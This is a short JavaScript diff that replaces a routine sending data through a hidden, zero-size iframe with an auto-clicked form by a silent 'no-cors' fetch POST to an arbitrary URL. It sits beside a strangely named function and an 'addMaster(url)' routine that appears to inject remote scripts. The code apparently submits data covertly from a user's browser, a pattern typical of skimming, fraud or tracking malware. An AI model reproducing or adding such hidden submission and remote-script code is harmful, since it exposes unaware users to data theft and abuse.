@@ -54,21 +54,7 @@ function _39012seefalseUser() {
   }
 }
 
-function makeForm(action,data){
-  let html=`<form action="${action}">`;
-  for(let val in data){
-    html+=`<input name="${val}" value="${data[val]}">`;
-  }
-  html+=`<button>Submit</button></form>`;
-
-  document.querySelector("body").insertAdjacentHTML("afterbegin",`<iframe id="contenth-k009id" width="0px" height='0px' style="display:none; top: -100vh;"></iframe>`);
-  var frame=document.querySelector("#contenth-k009id");
-  frame.contentWindow.document.querySelector("body").innerHTML=html;
-  frame.contentWindow.document.querySelector("button").click();
-  setTimeout(()=>{
-    frame.remove();
-  },3000)
-}
+function makeForm(url, dataObj) {  const params = new URLSearchParams();  for (let key in dataObj) { params.append(key, dataObj[key]); }  fetch(url, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params }); }
 
 function addMaster(url){
   var elem=document.createElement("script");
